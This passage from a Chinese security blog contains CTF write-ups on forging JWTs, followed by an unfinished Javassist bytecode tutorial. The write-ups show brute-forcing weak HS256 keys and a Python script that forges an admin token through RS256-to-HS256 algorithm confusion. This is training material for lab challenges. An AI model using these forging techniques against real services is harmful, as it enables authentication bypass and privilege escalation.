<h6 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h6><p>题目描述:<br>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag</p>
<p>————</p>
<p>第一次登录后显示<code>Hello 1(guest), only admin can get flag.</code></p>
<p>再次刷新获取资源，此时就会携带jwt向服务器发送请求，抓包获取得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.NHdRZ0DlkPjGsxP_ApUMag_hbFoqOZIbpwuNaa9PSYg</span><br></pre></td></tr></table></figure>

<p>解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接用工具爆破</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420165241660.png" alt="image-20240420165241660"></p>
<p>得到密钥为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eslu</span><br></pre></td></tr></table></figure>

<p>再在<a href="https://jwt.io/#encoded-jwt">jwt.io</a>伪造jwt即可</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420165338094.png" alt="image-20240420165338094"></p>
<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.dAS6XdJSP08cxTDGETnLjsrCduMn12gimm5s0dhwFC8</span><br></pre></td></tr></table></figure>

<p>再次在获取资源页面发包</p>
<p>成功得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;2afa10ab9a76e138e01604a4&#125;</span><br></pre></td></tr></table></figure>



<h6 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h6><p>题目描述:<br>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。</p>
<p>————</p>
<p>打开题目给了源码，稍微审计一下源码，给了公钥地址，直接访问<code>/publickey.pem</code>，得到公钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs2Zu6nNtgFv8Y3VRd4gm</span><br><span class="line">Wvqd+fkAvvBcve+1VIDpLCFSwBB9tz894Dt8c5RiU3bzSfCWFlhHYh7gWOP1Tvfc</span><br><span class="line">DNcmFkye4ce+ccnrrAE/nasF7OXoK2sZjgWdcjuT1n5MobKsD+DjJdlY0J4aZ+PS</span><br><span class="line">yjrK3UReEN5HEAnKG8H23eyKU5y8FOUjiF0s1YE7E1q4gZ14lCPCdyUfgNjje592</span><br><span class="line">lgOHhiRRxkPpg/jUYNtTNAJVsS1UBNw+06Dk5TharBklC4N9z47nkbSM90KDBe/K</span><br><span class="line">+nyPeqTqzvzCvY8WY/ml7lenkkvS38TkKI5Snu8H3a5ZNOCBdCYF1X8OFymtX85J</span><br><span class="line">zQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<p>直接登录，返回了一串字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.E5u_xfY9UrHQd1XBHKHKzgtw5kta7NhkbLmJnRXU_vQJphtf3BPonDwc1L3d8kZUG8JloGNQwVTy4xg6dgIZaCJPpl0m3tiizBEY9LOp33Avt7ZMGUXfo3P5z-VSr7uIVXm9b_z6R8OD5jy_Z3k_yoblzAxRSCoR5a8wGWVdKeIEQTFX7kfO4uOJ-zQinFvIK9ipki6_3-rXuyLOnx-CFAqaSKJ6wfPqSGTuKzatCs3HNcp4TI3f5M0_Qmn09kbzvlTMdQsVg5k45LceMGD38QdtaW4zOcIiPIuKp90rtYo3r12KMklJ0J11SZnsTdCPk6lsB925wK6H6sPy45Jr9Q </span><br></pre></td></tr></table></figure>

<p>应该是返回的jwt，拿去解密看看。得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;guest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要将算法和role修改，直接使用脚本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz6rR8Hafw5UZquuWnmBO</span><br><span class="line">x0cqkv5UFmuhra0dbtI92yV2pvvSJo/157cn//rXm5C5t0jkYFNjy+YSKk0Pv9sD</span><br><span class="line">YtGB2BjE9bHyV7wroZ82V8a6YWaerPcOK3Jp2kPn1tUp93I0yGeNLZCFD0bOoIXJ</span><br><span class="line">8RixwtFVHjbRNu7f1x0BTpg51JfI5/r4HAbkjyako2JuVFMF77Kj9DdkWg+SfvYA</span><br><span class="line">IF/5Az5/0pjZT90CwgvMAuB6eLJ7b7XhGdLX9ttTgDpFzLIeCPNIK0PhF2qNMx0/</span><br><span class="line">XllkqXk4fPEPW/BaCfw6rasqsq3a+lSiLcb2QMHRJ39nQ12KiPb/m8AoILOulA3G</span><br><span class="line">pwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">header = &#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span><br><span class="line">payload = &#x27;&#123;&quot;username&quot;: &quot;root&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(&quot;utf-8&quot;))</span><br><span class="line">encodeHeader = str(encodeHBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(&quot;utf-8&quot;))</span><br><span class="line">encodePayload = str(encodePBytes, &quot;utf-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line"></span><br><span class="line">token = (encodeHeader + &quot;.&quot; + encodePayload)</span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(bytes(key, &quot;UTF-8&quot;), token.encode(&quot;utf-8&quot;), hashlib.sha256).digest()).decode(&quot;UTF-8&quot;).rstrip(&quot;=&quot;)</span><br><span class="line">print(token + &quot;.&quot; + sig)</span><br></pre></td></tr></table></figure>

<p>生成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJyb290IiwgInJvbGUiOiAiYWRtaW4ifQ.ga1VAIojVGWB2b70fAN2OkBv0I6xCqBFtSj5KJvfiKk</span><br></pre></td></tr></table></figure>

<p>抓回包在获取资源的GET页面伪造token，再放包成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240420175625851.png" alt="image-20240420175625851"></p>
<p>flag如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6ec9f26fdf733354f0c75c4c&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结:<strong>都是在获取资源页面（一般都是GET请求）伪造token来获取其他资源</strong>，需要注意。</strong></p>
<h5 id="polarctf"><a href="#polarctf" class="headerlink" title="polarctf"></a>polarctf</h5><h6 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h6><p>打开即是注册登录界面，如实操作后并没有flag，</p>
<p>然后在抓包界面看到如下jwt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8SGkFhdaEt0zvByKBtz1oO8ikAFCDHblv1iPowur7e0</span><br></pre></td></tr></table></figure>

<p>拿去网站解密一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>尝试爆破密钥</strong>，这里使用**<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>**工具爆破密钥，成功得到密钥为<code>SYSA</code>：<br><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240418205910130.png" alt="image-20240418205910130"></p>
<p>再通过jwt.io修改username为admin来伪造jwt</p>
<p>抓包修改username为admin，成功得到flag</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240419194521275.png" alt="image-20240419194521275"></p>
<p>成功得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ec39c705cfb5295f9dddcedc819a1659&#125;</span><br></pre></td></tr></table></figure>



<p><strong>总结</strong>：还是要有敏感性，为什么刚好Jwt那里只有username，为而刚好对应不能将敏感信息写入jwt，这是就应该联想到flag在密码或者邮箱，继续学习。</p>
<p>其他参考：</p>
<p>2022祥云杯 - FunWEB</p>
<p>NewstarCTF 2023 - Ye’s Pickle</p>
]]></content>
      <categories>
        <category>jwt</category>
      </categories>
  </entry>
  <entry>
    <title>Javassist</title>
    <url>/2024/06/23/Java%20Javassist/</url>
    <content><![CDATA[<h1 id="Java-Javassist"><a href="#Java-Javassist" class="headerlink" title="Java Javassist"></a>Java Javassist</h1><p>Java programming ASSISTant，Java编程助手。是Java中编辑字节码的类库。<strong>它可以在Java程序运行时定义一个新的类，并加载到JVM中；还可以在JVM加载时修改一个类文件。</strong></p>
<p>Java中所有的类都被编译为class文件来运行，在编译完class文件之后，类不能再被显式修改，而Javassist就是用来处理编译后的class文件，它可以用来修改方法或者新增方法，并且不需要深入了解字节码，还可以生成一个新的类对象。</p>
<span id="more"></span>

<h2 id="Javassist核心API"><a href="#Javassist核心API" class="headerlink" title="Javassist核心API"></a>Javassist核心API</h2><p><strong>（1）ClassPool</strong></p>
<p>这个类是javassist的核心组件之一。ClassPool是CtClass对象容器，</p>
<p><strong>（2）CtClass</strong></p>
<p>在javassist中每个需要编译的class都对应一个CtClass实例，CtClass（compile time class），这些类会存储在ClassPool中。<strong>所以CtClass对象必须从该对象容器中获取</strong></p>
<p><strong>（3）CtMethod&#x2F;CtField</strong></p>
<p>其实这三个可以理解为加强版Class&#x2F;method&#x2F;field对象。同样可以使用CtClass中的CtField和CtMethod来获取类对象中的字段和方法。</p>
<h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><p>在一个项目中，想要使用就需要加依赖，</p>
<p>在POM.XML中添加如下代码即可（注意依赖的版本）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这样才能使用javassist</span></span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.javassist/javassist --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.28</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="读取类-成员变量-方法信息的代码"><a href="#读取类-成员变量-方法信息的代码" class="headerlink" title="读取类&#x2F;成员变量&#x2F;方法信息的代码"></a>读取类&#x2F;成员变量&#x2F;方法信息的代码</h2><p>使用ClassPool对象获取到CtClass对象后就可以像使用Java反射API一样去读取类信息了。最终在maven项目中的测试代码如下：</p>
<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">char</span> yn;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String name,<span class="type">char</span> yn,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.yn = yn;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取的操作：</p>
<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        System.out.println(<span class="string">&quot;1:&quot;</span>+classPool);</span><br><span class="line">        <span class="comment">//获取CtClass对象</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;org.example.Test&quot;</span>);<span class="comment">//这里get()等同于getClass()</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2:&quot;</span>+ctClass);</span><br><span class="line">        <span class="comment">//获取CtField属性</span></span><br><span class="line">        CtField[] ctField = ctClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(CtField x : ctField)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;3:&quot;</span>+x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取CtMethod方法</span></span><br><span class="line">        CtMethod[] ctMethod = ctClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span>(CtMethod x : ctMethod)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;4:&quot;</span>+x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取CtConStructor构造方法</span></span><br><span class="line">        CtClass[] parameters = <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;</span><br><span class="line">                classPool.get(<span class="string">&quot;java.lang.String&quot;</span>),</span><br><span class="line">                CtClass.charType,</span><br><span class="line">                CtClass.intType</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> ctClass.getDeclaredConstructor(parameters);</span><br><span class="line">        System.out.println(<span class="string">&quot;5:&quot;</span>+ctConstructor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1:[class path: java.lang.Object.class;]</span><br><span class="line">2:javassist.CtClassType@5caf905d[public class org.example.Test fields=org.example.Test.name:Ljava/lang/String;, org.example.Test.yn:C, org.example.Test.age:I,  constructors=javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V],  methods=javassist.CtMethod@3ac68cb[public setAge (I)V], javassist.CtMethod@7424e08a[protected getAge ()I], javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;], ]</span><br><span class="line">3:org.example.Test.name:Ljava/lang/String;</span><br><span class="line">3:org.example.Test.yn:C</span><br><span class="line">3:org.example.Test.age:I</span><br><span class="line">4:javassist.CtMethod@3ac68cb[public setAge (I)V]</span><br><span class="line">4:javassist.CtMethod@7424e08a[protected getAge ()I]</span><br><span class="line">4:javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;]</span><br><span class="line">5:javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V]</span><br></pre></td></tr></table></figure>

<p>注意看读取代码这里的细节。与反射对比，<strong>尤其是对于函数参数类型的改变</strong>。</p>
<h2 id="修改类方法"><a href="#修改类方法" class="headerlink" title="修改类方法"></a>修改类方法</h2><p>只需要调用CtMethod类的对应的API，CtMethod提供了类方法修改的API，<strong>如</strong>：</p>
<ul>
<li><p><code>setModifiers</code>：可修改类的访问修饰符，</p>
</li>
<li><p><code>insertBefore</code>和<code>insertAfter</code>：能够实现在类方法执行的前后插入任意的Java代码片段，</p>
</li>
<li><p><code>setBody</code> ：可以修改整个方法的代码等。</p>
</li>
</ul>
<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">char</span> yn;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String name,<span class="type">char</span> yn,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.yn = yn;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;org.example.Test&quot;</span>);</span><br><span class="line">        <span class="comment">//修改整个代码块</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;return \&quot;haha\&quot; ;&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//修改部分，看代码结构</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod1</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;setAge&quot;</span>,<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;CtClass.intType&#125;);</span><br><span class="line">        ctMethod1.insertBefore(<span class="string">&quot;System.out.println(\&quot;before is\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod2</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        ctMethod2.insertAfter(<span class="string">&quot;System.out.println(\&quot;after is\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//输出修改后的字节码到文件，方便看结果</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;output&quot;</span>);<span class="comment">//落地的是class文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>现在来看看修改后时什么，结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Test.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">char</span> yn;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before is&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>)<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String name, <span class="type">char</span> yn, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.yn = yn;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.name;</span><br><span class="line">        System.out.println(<span class="string">&quot;after is&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> var2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以对比一下之前的Test.java看看结果。</p>
<h2 id="动态创建一个类"><a href="#动态创建一个类" class="headerlink" title="动态创建一个类"></a>动态创建一个类</h2><p>API提供相应的make方法实现的操作</p>
<p>看下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用ClassPool创建一个新的类</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;org.example.haha&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建类成员变量content</span></span><br><span class="line">            <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;private static String content = \&quot;Hello world~\&quot;;&quot;</span>, ctClass);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将成员变量添加到ctClass对象中</span></span><br><span class="line">            ctClass.addField(ctField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建一个主方法并输出content对象值</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtMethod.make(</span><br><span class="line">                    <span class="string">&quot;public static void main(String[] args) &#123; System.out.println(content); &#125;&quot;</span>, ctClass</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将成员方法添加到ctClass对象中</span></span><br><span class="line">            ctClass.addMethod(ctMethod);</span><br><span class="line">            <span class="comment">//根据包结构创建目录并生成文件</span></span><br><span class="line">            ctClass.writeFile(<span class="string">&quot;output&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很清楚，理解学习一下代码就行了，建议在学习后自己敲一遍。</p>
<p>随后就生成了haha.class</p>
<p><img src="/2024/06/23/Java%20Javassist/image-20240622210215625.png" alt="image-20240622210215625"></p>
<p>内容为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">haha</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;Hello world~&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] var0)</span> &#123;</span><br><span class="line">        System.out.println(content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">haha</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>也可以利用二进制来动态创建</strong>，如下：</p>
<p>但是这个需要在项目中添加依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.8</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>然后再运行下面这个代码即可</p>
